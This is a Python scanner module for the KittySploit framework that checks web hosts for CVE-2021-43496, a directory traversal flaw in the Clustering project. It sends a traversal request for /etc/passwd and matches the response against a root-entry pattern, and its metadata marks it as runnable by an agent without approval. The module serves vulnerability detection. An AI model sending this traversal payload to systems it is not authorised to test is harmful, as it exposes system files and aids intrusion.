#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Clustering master branch as of commit 53e663e259bcfc8cdecb56c0bb255bd70bfcaa70 is affected by a directory trav."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Clustering Local File Inclusion Detection',
        'description': 'Clustering master branch as of commit 53e663e259bcfc8cdecb56c0bb255bd70bfcaa70 is affected by a directory traversal vulnerability. This attack can cause the disclosure of critical secrets stored anywhere on the system and can significantly aid in getting remote code access.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'clustering', 'clustering_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/varun-suresh/Clustering/issues/12',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43496',
            'https://github.com/StarCrossPortal/scalpel',
            'https://github.com/anonymous364872/Rapier_Tool',
            'https://github.com/apif-review/APIF_tool_2024',
        ],
        'cve': 'CVE-2021-43496',
    }

    def run(self):
        r = self.http_request(method="GET", path='/img/../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Clustering Local File Inclusion detected",
                path='/img/../../../../../../etc/passwd',
            )
            return True
        return False

